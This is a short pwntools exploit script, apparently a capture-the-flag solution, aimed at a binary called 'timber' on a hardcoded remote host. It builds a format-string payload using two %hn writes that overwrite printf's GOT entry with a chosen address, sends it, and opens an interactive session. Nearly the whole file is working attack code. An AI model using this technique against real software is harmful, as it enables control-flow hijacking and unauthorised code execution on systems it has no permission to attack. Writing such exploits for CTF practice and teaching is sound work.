#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('timber')

host = args.HOST or '18.222.250.47'
port = int(args.PORT or 12345)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
break *0x{exe.symbols.main:x}
continue
'''.format(**locals())

# -- Exploit goes here --

context.terminal = ['gnome-terminal', '-e']
io = start()

target = exe.got['printf']
off = 2
# 0x0804867b
write1 = 0x0804
write2 = 0x867b

payload = "{}{}%{}x%{}$hn%{}x%{}$hn".format(p32(target + 2), p32(target), write1 - 8, off, write2 - write1, off + 1)
log.info(payload)
io.sendline(payload)

io.interactive()

